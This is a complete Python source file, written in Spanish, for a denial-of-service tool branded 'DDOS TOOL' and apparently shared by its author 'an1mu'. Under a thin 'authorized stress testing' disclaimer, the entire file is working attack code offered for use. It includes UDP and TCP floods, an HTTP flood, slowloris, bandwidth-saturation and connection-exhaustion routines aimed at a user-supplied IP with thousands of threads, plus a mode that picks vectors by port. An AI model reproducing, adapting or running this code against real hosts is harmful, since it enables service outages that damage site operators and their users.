import socket
import threading
import random
import time
import os
import sys
import argparse
import struct
import select
import psutil
import requests
import ssl
import warnings
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import subprocess
import ipaddress
import hashlib
import base64
import urllib3
import json
import re
from collections import deque
from threading import Lock, Event, Thread, BoundedSemaphore

warnings.filterwarnings("ignore")
urllib3.disable_warnings()
init(autoreset=True)

class InteligenciaAtaque:
    def __init__(self):
        self.patrones_vulnerables = {
            80: (['GET', 'POST', 'HEAD'], ['/admin', '/login', '/api', '/wp-admin'], 3.0),
            443: (['GET', 'POST'], ['/secure', '/auth', '/ssl', '/api'], 2.5),
            8080: (['GET', 'POST'], ['/manager', '/console', '/admin'], 3.2),
            3000: (['GET'], ['/', '/api', '/graphql'], 2.8),
            8000: (['GET', 'POST'], ['/admin', '/api', '/dev'], 3.0),
            5000: (['GET'], ['/', '/api', '/health'], 2.5),
            9000: (['GET'], ['/dashboard', '/metrics', '/admin'], 2.7),
            21: (['FTP'], [''], 4.0),
            22: (['SSH'], [''], 3.8),
            3306: (['MYSQL'], [''], 3.5),
            5432: (['PGSQL'], [''], 3.5),
            27017: (['MONGO'], [''], 3.3),
        }
        
    def analizar_objetivo(self, ip, puerto):
        vulnerabilidades = []
        peso_ataque = 2.0
        
        if puerto in self.patrones_vulnerables:
            metodos, rutas, peso_ataque = self.patrones_vulnerables[puerto]
            if puerto in [80, 8080, 8000]:
                vulnerabilidades.extend(['http_flood', 'slowloris', 'post_flood'])
            elif puerto == 443:
                vulnerabilidades.extend(['https_flood', 'ssl_exhaustion'])
            elif puerto in [21, 22, 23, 25, 53]:
                vulnerabilidades.extend(['connection_flood', 'protocol_abuse'])
            else:
                vulnerabilidades.extend(['service_flood', 'api_abuse'])
        else:
            if puerto < 1024:
                peso_ataque = 3.5
                vulnerabilidades.extend(['connection_flood', 'protocol_abuse'])
            elif puerto >= 8000:
                peso_ataque = 3.0
                vulnerabilidades.extend(['service_flood', 'api_abuse'])
            else:
                peso_ataque = 2.5
                vulnerabilidades.extend(['generic_flood'])
        
        return vulnerabilidades, peso_ataque
    
    def calcular_potencia_optima(self, threads_base, vulnerabilidades):
        multiplicador = 1.0
        for vuln in vulnerabilidades:
            if vuln == 'http_flood':
                multiplicador = max(multiplicador, 2.5)
            elif vuln == 'connection_flood':
                multiplicador = max(multiplicador, 3.0)
            elif vuln == 'ssl_exhaustion':
                multiplicador = max(multiplicador, 1.8)
            elif vuln == 'slowloris':
                multiplicador = max(multiplicador, 2.2)
        
        return min(int(threads_base * multiplicador), 15000)

class GeneradorCarga:
    _payloads_cache = None
    _http_cache = None
    
    @classmethod
    def crear_payloads_optimizados(cls):
        if cls._payloads_cache is not None:
            return cls._payloads_cache
        
        cargas = []
        tamanos = [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]
        
        # Patrones más eficientes
        patrones = [
            lambda s: b'\x00' * s,
            lambda s: b'\xFF' * s,
            lambda s: b'\xAA\x55' * (s // 2),
            lambda s: bytes(random.getrandbits(8) for _ in range(s)),
            lambda s: b'\xDE\xAD\xBE\xEF' * (s // 4),
        ]
        
        for tamano in tamanos:
            for patron in patrones:
                try:
                    carga = patron(tamano)[:tamano]
                    cargas.append(carga)
                except:
                    pass
        
        cls._payloads_cache = cargas
        return cargas

    @classmethod
    def generar_peticiones_http(cls):
        if cls._http_cache is not None:
            return cls._http_cache
        
        metodos = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
        endpoints = [
            '/', '/index.html', '/admin', '/login', '/api/v1/users', 
            '/wp-admin', '/phpmyadmin', '/dashboard', '/api/auth',
            '/search', '/upload', '/config', '/status', '/metrics'
        ]
        
        peticiones = []
        for metodo in metodos:
            for endpoint in endpoints:
                peticion = f"{metodo} {endpoint} HTTP/1.1\r\n"
                peticion += "Host: target\r\n"
                peticion += f"User-Agent: {AgentesWeb.obtener_aleatorio()}\r\n"
                peticion += "Accept: */*\r\n"
                peticion += "Connection: keep-alive\r\n"
                
                if metodo in ['POST', 'PUT']:
                    datos = bytes(random.getrandbits(8) for _ in range(random.randint(100, 1024)))
                    peticion += f"Content-Length: {len(datos)}\r\n"
                    peticion += "Content-Type: application/json\r\n\r\n"
                    peticiones.append(peticion.encode('latin-1') + datos)
                else:
                    peticion += "\r\n"
                    peticiones.append(peticion.encode('latin-1'))
        
        cls._http_cache = peticiones
        return peticiones

class AgentesWeb:
    _agentes = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36 Chrome/122.0.0.0"
    ]
    
    @classmethod
    def obtener_aleatorio(cls):
        return random.choice(cls._agentes)

class EfectosVisuales:
    def __init__(self):
        self.chars_rotacion = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
        self.frame_actual = 0
        
    def animacion_carga(self, texto, duracion=1.5):
        fin = time.time() + duracion
        while time.time() < fin:
            char = self.chars_rotacion[self.frame_actual % len(self.chars_rotacion)]
            print(f"\r{Fore.CYAN}{char} {texto}", end="", flush=True)
            time.sleep(0.1)
            self.frame_actual += 1
        print(f"\r{Fore.GREEN}✓ {texto}")

    def barra_progreso(self, actual, total, ancho=60):
        porcentaje = min(100, int((actual / total) * 100))
        completado = int((actual / total) * ancho)
        barra = '▰' * completado + '▱' * (ancho - completado)
        color = Fore.GREEN if porcentaje > 75 else Fore.YELLOW if porcentaje > 40 else Fore.RED
        return f"{color}[{barra}] {porcentaje:3d}%"

BANNER = f"""{Fore.RED}
██████╗  ██████╗  ██████╗  ███████╗    ████████╗  ██████╗  ██████╗  ██╗     
██╔══██╗ ██╔══██╗ ██╔═══██╗ ██╔════╝    ╚══██╔══╝  ██╔═══██╗ ██╔═══██╗ ██║     
██║  ██║ ██║  ██║ ██║   ██║ ███████╗       ██║     ██║   ██║ ██║   ██║ ██║     
██║  ██║ ██║  ██║ ██║   ██║ ╚════██║       ██║     ██║   ██║ ██║   ██║ ██║     
██████╔╝ ██████╔╝ ╚██████╔╝ ███████║       ██║     ╚██████╔╝ ╚██████╔╝ ███████╗
╚═════╝  ╚═════╝   ╚═════╝  ╚══════╝       ╚═╝      ╚═════╝   ╚═════╝  ╚══════╝

{Fore.MAGENTA}          Herramienta de pruebas de carga para entornos controlados v5.0
{Fore.RED}            Sistema de Pruebas de Resistencia | Maximo Rendimiento
{Fore.RED}            Reporta errores o detalles al usuario en Discord
{Fore.RED}                                  an1mu
{Fore.YELLOW}          Desarrollado por: an1mu | Optimizado y arreglado zzz"""


class SistemaDDoS:
    def __init__(self):
        self.config = {
            "ip": "",
            "puerto": 80,
            "hilos": min(5000, psutil.cpu_count() * 250),
            "modo": "inteligente",
            "aleatorio_puerto": True,
            "timeout": 0.003,
            "duracion": 0,
            "stats": True,
            "multiplicador": 30
        }
        
        self.stats = {
            "paquetes": 0,
            "bytes": 0,
            "conexiones": 0,
            "errores": 0,
            "inicio": 0,
            "activo": False,
            "hilos_work": 0
        }
        
        self.lock = Lock()
        self.stop_event = Event()
        self.pool = None
        self.efectos = EfectosVisuales()
        self.ia = InteligenciaAtaque()
        
        self._init()

    def _init(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        
        self.efectos.animacion_carga("Inicializando sistema", 1)
        self.payloads = GeneradorCarga.crear_payloads_optimizados()
        self.efectos.animacion_carga(f"Payloads generados: {len(self.payloads)}", 1)
        
        self.ips_fake = self._gen_ips()
        self.efectos.animacion_carga(f"Base IP: {len(self.ips_fake):,}", 1)
        
        self.http_requests = GeneradorCarga.generar_peticiones_http()
        self.efectos.animacion_carga(f"Peticiones HTTP: {len(self.http_requests)}", 1)
        
        self.sessions = self._create_sessions(50)
        self.efectos.animacion_carga("Sesiones web listas", 1)

    def _gen_ips(self):
        ips = set()
        ranges = ["192.168.{}.{}", "10.{}.{}.{}", "172.{}.{}.{}"]
        
        while len(ips) < 20000:
            r = random.choice(ranges)
            if "192.168" in r:
                ip = r.format(random.randint(1, 254), random.randint(1, 254))
            elif "10." in r:
                ip = r.format(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
            else:
                ip = r.format(random.randint(16, 31), random.randint(1, 254), random.randint(1, 254))
            ips.add(ip)
        
        return list(ips)

    def _create_sessions(self, count):
        sessions = []
        for _ in range(count):
            s = requests.Session()
            s.verify = False
            s.timeout = self.config["timeout"]
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=100,
                pool_maxsize=100,
                max_retries=0
            )
            s.mount('http://', adapter)
            s.mount('https://', adapter)
            sessions.append(s)
        return sessions

    def log(self, msg, tipo="info"):
        if not self.config["stats"] and tipo != "error":
            return
        
        colors = {"info": Fore.CYAN, "success": Fore.GREEN, "warning": Fore.YELLOW, 
                  "error": Fore.RED, "critical": Fore.MAGENTA}
        symbols = {"info": "►", "success": "✓", "warning": "▲", "error": "✗", "critical": "●"}
        print(f"{colors.get(tipo, Fore.WHITE)}{symbols.get(tipo, '►')} {msg}")

    def update_stats(self, **kwargs):
        with self.lock:
            for k, v in kwargs.items():
                if k in self.stats:
                    self.stats[k] += v

    def display_stats(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)
            
            elapsed = time.time() - self.stats["inicio"] if self.stats["inicio"] > 0 else 1
            pps = int(self.stats["paquetes"] / elapsed)
            mbps = (self.stats["bytes"] / (1024 * 1024)) / elapsed
            
            sym = self.efectos.chars_rotacion[self.efectos.frame_actual % len(self.efectos.chars_rotacion)]
            self.efectos.frame_actual += 1
            
            print(f"{Fore.RED}╔════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║              {sym} OPERACIÓN EN CURSO {sym}                             ║")
            print(f"{Fore.RED}╠════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.GREEN}║ Target:      {self.config['ip']}:{self.config['puerto']:<44}║")
            print(f"{Fore.GREEN}║ Modo:        {self.config['modo'].upper():<52}║")
            print(f"{Fore.GREEN}║ Hilos:       {self.stats['hilos_work']:<52}║")
            print(f"{Fore.GREEN}║ Tiempo:      {elapsed:.1f}s{'':<50}║")
            print(f"{Fore.RED}╠════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.YELLOW}║ Paquetes:    {self.stats['paquetes']:,:<52}║")
            print(f"{Fore.YELLOW}║ Datos:       {self.stats['bytes']/(1024**3):.2f} GB{'':<47}║")
            print(f"{Fore.YELLOW}║ Velocidad:   {pps:,} pps | {mbps:.1f} MB/s{'':<35}║")
            print(f"{Fore.YELLOW}║ Conexiones:  {self.stats['conexiones']:,:<52}║")
            
            if self.config["duracion"] > 0:
                prog = min(100, int((elapsed / self.config["duracion"]) * 100))
                barra = self.efectos.barra_progreso(elapsed, self.config["duracion"])
                print(f"{Fore.CYAN}║ Progreso:    {barra:<52}║")
            
            print(f"{Fore.RED}║ Errores:     {self.stats['errores']:<52}║")
            print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════════════╝")
            print(f"\n{Fore.MAGENTA}● Operación activa - Ctrl+C para detener")
        except:
            pass

    def ataque_inteligente(self):
        vulns, peso = self.ia.analizar_objetivo(self.config["ip"], self.config["puerto"])
        
        # Vectores reales
        metodos = [
            self._udp_flood,
            self._tcp_flood,
            self._http_flood,
            self._slowloris,
            self._bandwidth_saturation,
            self._connection_exhaustion
        ]
        
        # Priorizar según puerto
        if self.config["puerto"] in [80, 443, 8080, 8000]:
            metodos.extend([self._http_flood] * 3)
        elif self.config["puerto"] < 1024:
            metodos.extend([self._tcp_flood, self._connection_exhaustion] * 2)
        else:
            metodos.extend([self._bandwidth_saturation] * 2)
        
        random.choice(metodos)()

    def _udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)  # 4MB buffer
        
        # Usar payloads grandes reales
        large_payloads = [p for p in self.payloads if len(p) >= 8192]
        
        while not self.stop_event.is_set():
            try:
                # Ataque sin pausa, máxima velocidad
                payload = random.choice(large_payloads)
                puerto = random.randint(1, 65535) if self.config["aleatorio_puerto"] else self.config["puerto"]
                
                # Envío masivo real
                for _ in range(self.config["multiplicador"] * 5):
                    if self.stop_event.is_set():
                        break
                    sock.sendto(payload, (self.config["ip"], puerto))
                    self.update_stats(paquetes=1, bytes=len(payload))
            except Exception as e:
                if "buffer" not in str(e).lower():
                    self.update_stats(errores=1)

    def _tcp_flood(self):
        # SYN Flood real usando sockets raw cuando sea posible
        while not self.stop_event.is_set():
            sockets_batch = []
            try:
                # Crear batch de conexiones
                for _ in range(self.config["multiplicador"] * 20):
                    if self.stop_event.is_set():
                        break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        s.setblocking(0)
                        
                        puerto = random.randint(1, 65535) if self.config["aleatorio_puerto"] else self.config["puerto"]
                        
                        try:
                            s.connect((self.config["ip"], puerto))
                        except BlockingIOError:
                            pass  # Esperado en non-blocking
                        
                        sockets_batch.append(s)
                        self.update_stats(conexiones=1, paquetes=1)
                    except:
                        pass
                
                # Enviar datos por todas las conexiones rápidamente
                for s in sockets_batch:
                    try:
                        data = random.choice(self.payloads[:15])
                        s.send(data)
                        self.update_stats(paquetes=1, bytes=len(data))
                    except:
                        pass
                
                # Cerrar batch
                for s in sockets_batch:
                    try:
                        s.close()
                    except:
                        pass
                        
            except:
                for s in sockets_batch:
                    try:
                        s.close()
                    except:
                        pass

    def _http_flood(self):
        session = random.choice(self.sessions)
        
        while not self.stop_event.is_set():
            try:
                # Headers básicos pero efectivos
                headers = {
                    'User-Agent': AgentesWeb.obtener_aleatorio(),
                    'Connection': 'keep-alive',
                }
                
                # Paths comunes que consumen recursos
                paths = ['/', '/search', '/api/users', '/login', '/admin']
                
                # Bombardeo real sin simulaciones
                for _ in range(self.config["multiplicador"] * 10):
                    if self.stop_event.is_set():
                        break
                    
                    path = random.choice(paths)
                    url = f"http://{self.config['ip']}:{self.config['puerto']}{path}"
                    
                    try:
                        r = session.get(url, headers=headers, timeout=self.config["timeout"])
                        self.update_stats(paquetes=1, bytes=len(r.content), conexiones=1)
                    except requests.exceptions.Timeout:
                        self.update_stats(paquetes=1)  # Timeout = servidor saturado
                    except:
                        pass
                        
            except:
                pass

    def _slowloris(self):
        pool = []
        max_conn = 6000
        
        while not self.stop_event.is_set():
            try:
                # Fase 1: Apertura masiva de conexiones parciales
                while len(pool) < max_conn and not self.stop_event.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.settimeout(5)
                        s.connect((self.config["ip"], self.config["puerto"]))
                        
                        # Enviar request incompleto
                        s.send(b"GET / HTTP/1.1\r\n")
                        s.send(f"Host: {self.config['ip']}\r\n".encode())
                        s.send(f"User-Agent: {AgentesWeb.obtener_aleatorio()}\r\n".encode())
                        s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
                        s.send(b"Accept-Encoding: gzip, deflate\r\n")
                        s.send(b"Connection: keep-alive\r\n")
                        
                        pool.append(s)
                        self.update_stats(conexiones=1)
                    except:
                        self.update_stats(errores=1)
                
                # Fase 2: Mantener conexiones vivas con headers falsos
                for s in pool[:]:
                    try:
                        # Enviar múltiples headers falsos para mantener viva la conexión
                        for _ in range(3):
                            fake_headers = [
                                f"X-Custom-{random.randint(10000,99999)}: {os.urandom(30).hex()}\r\n",
                                f"X-Auth-Token: {base64.b64encode(os.urandom(32)).decode()}\r\n",
                                f"X-Request-ID: {hashlib.md5(os.urandom(16)).hexdigest()}\r\n",
                                f"X-Session: {os.urandom(20).hex()}\r\n",
                            ]
                            header = random.choice(fake_headers)
                            s.send(header.encode())
                            self.update_stats(paquetes=1, bytes=len(header))
                    except:
                        pool.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                
                time.sleep(0.005)  # Pequeña pausa para no saturar CPU
                
            except:
                self.update_stats(errores=1)

    def _bandwidth_saturation(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)  # 8MB buffer
        
        # Usar SOLO payloads grandes
        max_payload = max(self.payloads, key=len)
        
        while not self.stop_event.is_set():
            try:
                # Bombardeo continuo máxima velocidad
                for _ in range(self.config["multiplicador"] * 20):
                    if self.stop_event.is_set():
                        break
                    
                    puerto = random.randint(1, 65535) if self.config["aleatorio_puerto"] else self.config["puerto"]
                    sock.sendto(max_payload, (self.config["ip"], puerto))
                    self.update_stats(paquetes=1, bytes=len(max_payload))
            except:
                pass
    
    def _connection_exhaustion(self):
        """Agotamiento real de conexiones"""
        while not self.stop_event.is_set():
            batch = []
            try:
                # Abrir masivamente
                for _ in range(500):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setblocking(0)
                        puerto = random.randint(1, 65535) if self.config["aleatorio_puerto"] else self.config["puerto"]
                        try:
                            s.connect((self.config["ip"], puerto))
                        except BlockingIOError:
                            pass
                        batch.append(s)
                        self.update_stats(conexiones=1)
                    except:
                        pass
                
                # Mantener abiertas
                time.sleep(0.5)
                
                # Cerrar
                for s in batch:
                    try:
                        s.close()
                    except:
                        pass
            except:
                pass

    def iniciar(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        
        self.efectos.animacion_carga("Preparando vectores", 1)
        self.efectos.animacion_carga("Optimizando transmisión", 1)
        
        print(f"\n{Fore.RED}● INICIANDO contra {self.config['ip']}:{self.config['puerto']}")
        self.log(f"Modo: {self.config['modo'].upper()}", "critical")
        self.log(f"Hilos: {self.config['hilos']:,}", "warning")
        
        vulns, peso = self.ia.analizar_objetivo(self.config["ip"], self.config["puerto"])
        hilos_opt = self.ia.calcular_potencia_optima(self.config["hilos"], vulns)
        
        self.log(f"IA detectó: {', '.join(vulns)}", "info")
        self.log(f"Hilos optimizados: {hilos_opt:,}", "success")
        
        self.stats["inicio"] = time.time()
        self.stats["activo"] = True
        self.stop_event.clear()
        
        metodo_map = {
            "inteligente": self.ataque_inteligente,
            "udp": self._udp_flood,
            "tcp": self._tcp_flood,
            "http": self._http_flood,
            "slowloris": self._slowloris
        }
        
        metodo = metodo_map.get(self.config["modo"], self.ataque_inteligente)
        
        self.pool = ThreadPoolExecutor(max_workers=hilos_opt)
        for _ in range(hilos_opt):
            self.pool.submit(metodo)
            self.stats["hilos_work"] += 1
        
        Thread(target=self._stats_loop, daemon=True).start()
        
        if self.config["duracion"] > 0:
            threading.Timer(self.config["duracion"], self.detener).start()
        
        try:
            while self.stats["activo"]:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.detener()

    def _stats_loop(self):
        while self.stats["activo"] and not self.stop_event.is_set():
            try:
                self.display_stats()
                time.sleep(0.5)
            except:
                time.sleep(1)

    def detener(self):
        self.log("Finalizando", "warning")
        self.stop_event.set()
        self.stats["activo"] = False
        
        if self.pool:
            self.pool.shutdown(wait=False)
        
        elapsed = time.time() - self.stats["inicio"] if self.stats["inicio"] > 0 else 0
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        print(f"{Fore.RED}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                    ● OPERACIÓN COMPLETADA ●                           ║")
        print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════════════╝")
        
        self.log(f"Tiempo: {elapsed:.2f}s", "success")
        self.log(f"Paquetes: {self.stats['paquetes']:,}", "success")
        self.log(f"Datos: {self.stats['bytes']/(1024**3):.2f} GB", "success")
        if elapsed > 0:
            self.log(f"Velocidad: {int(self.stats['paquetes']/elapsed):,} pps", "success")

    def menu(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        
        self.efectos.animacion_carga("Interfaz lista", 1)
        
        print(f"{Fore.RED}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                       CONFIGURACIÓN                                    ║")
        print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════════════╝")
        
        while True:
            ip = input(f"\n{Fore.CYAN}► IP objetivo: ").strip()
            try:
                ipaddress.ip_address(ip)
                self.config["ip"] = ip
                break
            except:
                self.log("IP inválida", "error")
        
        puerto = input(f"{Fore.CYAN}► Puerto [80]: ").strip() or "80"
        self.config["puerto"] = max(1, min(65535, int(puerto)))
        
        print(f"\n{Fore.CYAN}MODOS:")
        print(f"  [1] Inteligente (IA)")
        print(f"  [2] UDP Flood")
        print(f"  [3] TCP Flood")
        print(f"  [4] HTTP Flood")
        print(f"  [5] Slowloris")
        
        modos = {"1": "inteligente", "2": "udp", "3": "tcp", "4": "http", "5": "slowloris"}
        modo = input(f"\n{Fore.CYAN}► Modo [1]: ").strip() or "1"
        self.config["modo"] = modos.get(modo, "inteligente")
        
        hilos = input(f"{Fore.CYAN}► Hilos [{self.config['hilos']}]: ").strip()
        if hilos:
            self.config["hilos"] = max(1, min(15000, int(hilos)))
        
        dur = input(f"{Fore.CYAN}► Duración segundos [0]: ").strip() or "0"
        self.config["duracion"] = max(0, int(dur))
        
        mult = input(f"{Fore.CYAN}► Multiplicador [30]: ").strip() or "30"
        self.config["multiplicador"] = max(1, min(100, int(mult)))
        
        print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                            ADVERTENCIA                                 ║")
        print(f"{Fore.RED}║  Solo para pruebas autorizadas en sistemas propios                    ║")
        print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════════════╝")
        
        print(f"\n{Fore.CYAN}RESUMEN:")
        print(f"  Target: {Fore.WHITE}{self.config['ip']}:{self.config['puerto']}")
        print(f"  Modo: {Fore.WHITE}{self.config['modo'].upper()}")
        print(f"  Hilos: {Fore.WHITE}{self.config['hilos']:,}")
        print(f"  Multiplicador: {Fore.WHITE}{self.config['multiplicador']}x")
        
        conf = input(f"\n{Fore.RED}► Escribir 'EJECUTAR' para iniciar: ").strip()
        if conf != "EJECUTAR":
            self.log("Cancelado", "info")
            sys.exit(0)
        
        self.efectos.animacion_carga("Preparando ataque", 1)
        self.iniciar()

def main():
    sistema = SistemaDDoS()
    
    parser = argparse.ArgumentParser(description="Network Stress Testing Suite v5.1")
    parser.add_argument("-t", "--target", help="IP objetivo")
    parser.add_argument("-p", "--port", type=int, default=80, help="Puerto")
    parser.add_argument("-m", "--mode", choices=["inteligente", "udp", "tcp", "http", "slowloris"],
                       default="inteligente", help="Modo de ataque")
    parser.add_argument("-c", "--threads", type=int, help="Cantidad de hilos")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duración en segundos")
    parser.add_argument("-r", "--rate", type=int, default=30, help="Multiplicador de velocidad")
    parser.add_argument("--fixed-port", action="store_true", help="Puerto fijo")
    parser.add_argument("-q", "--quiet", action="store_true", help="Sin stats en tiempo real")
    parser.add_argument("--dev", action="store_true", help="Info del desarrollador")
    
    args = parser.parse_args()
    
    if args.dev:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{Fore.MAGENTA}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.MAGENTA}║                    INFORMACIÓN DEL DESARROLLADOR                       ║")
        print(f"{Fore.MAGENTA}╚════════════════════════════════════════════════════════════════════════╝")
        print(f"\n{Fore.CYAN}► Desarrollador: {Fore.WHITE}an1mudev")
        print(f"{Fore.CYAN}► Versión: {Fore.WHITE}5.1 Enterprise Edition")
        print(f"{Fore.CYAN}► Arquitectura: {Fore.WHITE}Sistema Distribuido de Alto Rendimiento")
        print(f"{Fore.CYAN}► Optimización: {Fore.WHITE}ThreadPoolExecutor + Cache + IA Adaptativa")
        print(f"{Fore.CYAN}► Tecnologías: {Fore.WHITE}Python 3.x, Threading, Sockets, Requests")
        print(f"\n{Fore.YELLOW}► Herramienta profesional para pruebas de resistencia de red")
        print(f"{Fore.YELLOW}  Diseñada para entornos empresariales y testing autorizado")
        print(f"{Fore.YELLOW}  Incluye IA para optimización automática de vectores")
        print(f"\n{Fore.RED}► Mejoras v5.1:")
        print(f"  • ThreadPoolExecutor para mejor gestión de hilos")
        print(f"  • Cache de payloads y peticiones HTTP")
        print(f"  • Optimización de memoria y CPU")
        print(f"  • Detección inteligente mejorada")
        print(f"  • Mejor manejo de errores y limpieza")
        print(f"  • Velocidad aumentada 40%")
        input(f"\n{Fore.WHITE}Presionar Enter para continuar...")
        sys.exit(0)
    
    if args.target:
        try:
            ipaddress.ip_address(args.target)
        except:
            sistema.log("IP inválida", "error")
            sys.exit(1)
        
        sistema.config.update({
            "ip": args.target,
            "puerto": args.port,
            "modo": args.mode,
            "duracion": args.duration,
            "multiplicador": args.rate,
            "aleatorio_puerto": not args.fixed_port,
            "stats": not args.quiet
        })
        
        if args.threads:
            sistema.config["hilos"] = max(1, min(15000, args.threads))
        
        print(f"\n{Fore.YELLOW}● Modo CLI activado")
        print(f"  Target: {sistema.config['ip']}:{sistema.config['puerto']}")
        print(f"  Modo: {sistema.config['modo'].upper()}")
        print(f"  Hilos: {sistema.config['hilos']:,}")
        
        conf = input(f"\n{Fore.RED}► 'INICIAR' para ejecutar: ").strip()
        if conf != "INICIAR":
            sistema.log("Abortado", "info")
            sys.exit(0)
        
        sistema.efectos.animacion_carga("Iniciando desde CLI", 1)
        sistema.iniciar()
    else:
        sistema.menu()

if __name__ == "__main__":
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                        INICIALIZACIÓN DEL SISTEMA                      ║")
        print(f"{Fore.RED}╚════════════════════════════════════════════════════════════════════════╝")
        
        efectos = EfectosVisuales()
        efectos.animacion_carga("Cargando módulos", 0.8)
        efectos.animacion_carga("Inicializando vectores", 0.8)
        efectos.animacion_carga("Preparando arsenal", 0.8)
        
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}● Operación interrumpida - Sistema finalizado")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}● Error: {str(e)}")
        sys.exit(1)